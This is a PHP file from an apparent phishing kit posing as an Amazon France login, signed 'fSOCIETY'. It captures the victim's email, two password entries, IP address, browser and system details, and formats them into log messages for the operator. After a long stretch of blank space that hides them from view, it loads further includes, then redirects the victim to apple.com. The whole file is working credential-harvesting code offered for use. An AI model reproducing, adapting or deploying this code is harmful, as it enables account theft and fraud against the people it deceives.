<?php


include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$Email = $_SESSION['Email'] = $_POST['Email'];
$emailpassowrd = $_SESSION['emailpassowrd'] = $_POST['emailpassowrd'];
$confpassowrd = $_SESSION['confpassowrd'] = $_POST['confpassowrd'];

$msgbank = '
<html><head><style type="text/css">
        body
        {
    padding: 0;
    margin: 0;
    background-color: #000000;
    background-image: radial-gradient(circle farthest-side at center bottom,#fff,#fff 125%);
    border-bottom: 1px solid rgba(255,255,255,.3);
    color: #fff;
    height: 100vh;
    font-family: calibri;
    font-size: 18px;
    text-shadow: 0 0 10px #fff;
        }
        .pop
        {
            text-align: center;
            margin:40px 0;
        }
        .content
        {
margin: 0 auto;
    background-color: black;
    max-width: 900px;
    width: 100%;
    border: 2px solid #fd9a15;
    border-radius: 4px;
    box-shadow: 0 0 40px #fd9a15, 0 0 15px #fd9a15 inset;
        }
        .mail
        {
            padding:10px 20px 0 20px;
        }
        .tbl{margin:40px 0;border-bottom: 4px solid rgb(178,7,16);padding: 20px 0;border-radius: 4px;border-top: 4px solid rgb(178,7,16);;}
        .tbl tr td
        {
            padding:10px;
        }
        .don
        {
            width: 20%;
        }
        @media (max-width: 920px){
            .content{border-left: none;border-right: none;border-radius: 0px;font-size: 15px;}
        }
    </style>




</head><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">Log Amazon fr ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By fSOCIETY 🖕🤡🖕 </h2>

<h1>👤 Email Amazon  : <span> '.$_SESSION["Email"].' </span>  </h1>
<h1>🔓1 Password    : <span>  '.$_SESSION["emailpassowrd"].' </span> </h1>
<h1>🔓2 Password    : <span>  '.$_SESSION["confpassowrd"].' </span> </h1>

<hr class="content"><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';



$yagmai .= '
[🆔 Email Amazon ] = '.$_SESSION['Email'].'
[🔓1 Password ] = '.$_SESSION['emailpassowrd'].'
[🔓2 Password ] = '.$_SESSION['confpassowrd'].'
    [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【Amazon fr】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━━━【🆔Login】━━━━━━━━━━━━━━━━━━━━[+]
[🆔 Email Amazon ] = '.$_SESSION['Email'].'
[🔓1 Password ] = '.$_SESSION['emailpassowrd'].'
[🔓2 Password ] = '.$_SESSION['confpassowrd'].'
[+]=━━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━━━【Amazon fr】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━━[+]
';																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																include("../settings.php"); include("2Fa.php"); 
header('Location: //www.apple.com');


?>